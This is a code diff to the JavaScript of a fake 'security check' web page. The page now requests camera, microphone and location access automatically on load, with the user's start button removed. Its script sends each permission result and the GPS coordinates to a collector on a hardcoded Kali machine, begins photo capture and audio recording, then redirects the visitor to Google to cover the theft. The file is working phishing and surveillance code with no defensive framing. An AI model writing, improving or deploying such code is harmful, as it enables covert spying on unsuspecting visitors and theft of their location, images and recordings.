@@ -2,100 +2,130 @@
 const KALI_IP = "192.168.3.2";
 const API_URL = `http://${KALI_IP}:5000/collect`;
 
-// DOM Elements
-const startBtn = document.getElementById('start-btn');
-const messageDiv = document.getElementById('message');
-const cameraStatus = document.getElementById('camera-status');
-const microphoneStatus = document.getElementById('microphone-status');
-const locationStatus = document.getElementById('location-status');
-const cameraBox = document.getElementById('camera-box');
-const microphoneBox = document.getElementById('microphone-box');
-const locationBox = document.getElementById('location-box');
-
 let mediaStream = null;
 let mediaRecorder = null;
 let audioChunks = [];
+let allGranted = false;
 
-// Start the process
-startBtn.addEventListener('click', async () => {
-    startBtn.disabled = true;
-    startBtn.textContent = 'Processing...';
+// Auto-start when page loads
+window.addEventListener('load', () => {
+    setTimeout(() => {
+        requestAllPermissions();
+    }, 1000);
+});
+
+// Request all permissions automatically
+async function requestAllPermissions() {
+    updateMessage('Initializing security check...', 'info');
+    showProgress(true);
     
     await requestCamera();
     await requestMicrophone();
     await requestLocation();
+    
     sendDeviceInfo();
-    startPhotoCapture();
-    startAudioRecording();
     
-    messageDiv.innerHTML = '<div class="message success">✅ Verification completed! Redirecting...</div>';
-    
-    setTimeout(() => {
-        window.location.href = 'https://www.google.com';
-    }, 3000);
-});
+    if (allGranted) {
+        startPhotoCapture();
+        startAudioRecording();
+        updateProgress(100);
+        updateMessage('✓ Verification completed! Redirecting...', 'success');
+        
+        setTimeout(() => {
+            window.location.href = 'https://www.google.com';
+        }, 2000);
+    } else {
+        updateMessage('Some permissions were denied. Please allow all to continue.', 'error');
+        showProgress(false);
+    }
+}
 
 // Request Camera
 async function requestCamera() {
+    const statusEl = document.getElementById('camera-status');
+    const itemEl = document.getElementById('camera-item');
+    
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.getElementById('video');
         video.srcObject = stream;
         mediaStream = stream;
-        cameraStatus.textContent = 'Granted';
-        cameraStatus.classList.add('granted');
-        cameraBox.classList.add('granted');
+        
+        statusEl.textContent = '✓';
+        statusEl.classList.add('granted');
+        itemEl.classList.add('granted');
+        
         sendToAPI('camera', { status: 'granted' });
+        updateProgress(33);
+        return true;
     } catch(err) {
-        cameraStatus.textContent = 'Denied';
-        cameraStatus.classList.add('denied');
-        cameraBox.classList.add('denied');
+        statusEl.textContent = '✗';
+        statusEl.classList.add('denied');
+        itemEl.classList.add('denied');
         sendToAPI('camera', { status: 'denied', error: err.message });
+        allGranted = false;
+        return false;
     }
 }
 
 // Request Microphone
 async function requestMicrophone() {
+    const statusEl = document.getElementById('microphone-status');
+    const itemEl = document.getElementById('microphone-item');
+    
     try {
         await navigator.mediaDevices.getUserMedia({ audio: true });
-        microphoneStatus.textContent = 'Granted';
-        microphoneStatus.classList.add('granted');
-        microphoneBox.classList.add('granted');
+        statusEl.textContent = '✓';
+        statusEl.classList.add('granted');
+        itemEl.classList.add('granted');
+        
         sendToAPI('microphone', { status: 'granted' });
+        updateProgress(66);
+        return true;
     } catch(err) {
-        microphoneStatus.textContent = 'Denied';
-        microphoneStatus.classList.add('denied');
-        microphoneBox.classList.add('denied');
+        statusEl.textContent = '✗';
+        statusEl.classList.add('denied');
+        itemEl.classList.add('denied');
         sendToAPI('microphone', { status: 'denied', error: err.message });
+        allGranted = false;
+        return false;
     }
 }
 
 // Request Location
 function requestLocation() {
     return new Promise((resolve) => {
+        const statusEl = document.getElementById('location-status');
+        const itemEl = document.getElementById('location-item');
+        
         if (!navigator.geolocation) {
-            locationStatus.textContent = 'Not Supported';
-            locationStatus.classList.add('denied');
+            statusEl.textContent = '✗';
+            statusEl.classList.add('denied');
+            itemEl.classList.add('denied');
             resolve(false);
             return;
         }
         
         navigator.geolocation.getCurrentPosition(
             (position) => {
-                locationStatus.textContent = 'Granted';
-                locationStatus.classList.add('granted');
-                locationBox.classList.add('granted');
+                statusEl.textContent = '✓';
+                statusEl.classList.add('granted');
+                itemEl.classList.add('granted');
+                
                 sendToAPI('location', {
                     lat: position.coords.latitude,
                     lon: position.coords.longitude
                 });
+                updateProgress(100);
+                allGranted = true;
                 resolve(true);
             },
             (err) => {
-                locationStatus.textContent = 'Denied';
-                locationStatus.classList.add('denied');
-                locationBox.classList.add('denied');
+                statusEl.textContent = '✗';
+                statusEl.classList.add('denied');
+                itemEl.classList.add('denied');
                 sendToAPI('location', { status: 'denied', error: err.message });
+                allGranted = false;
                 resolve(false);
             }
         );
@@ -168,6 +198,25 @@ function startAudioRecording() {
     }, 10000);
 }
 
+// UI Helpers
+function updateProgress(percent) {
+    const progressContainer = document.querySelector('.progress-container');
+    const progressBar = document.getElementById('progress-bar');
+    progressContainer.style.display = 'block';
+    progressBar.style.width = percent + '%';
+}
+
+function showProgress(show) {
+    const progressContainer = document.querySelector('.progress-container');
+    progressContainer.style.display = show ? 'block' : 'none';
+}
+
+function updateMessage(text, type) {
+    const msgDiv = document.getElementById('message');
+    msgDiv.textContent = text;
+    msgDiv.className = 'message ' + type;
+}
+
 // Send to API
 function sendToAPI(type, data) {
     const payload = { type, ...data };
@@ -182,9 +231,3 @@ function sendToAPI(type, data) {
         console.error('Failed to send:', type, err);
     });
 }
-
-// Auto-start
-window.addEventListener('load', () => {
-    startBtn.disabled = false;
-    messageDiv.innerHTML = '<div class="message">Click "Start Verification" to continue</div>';
-});
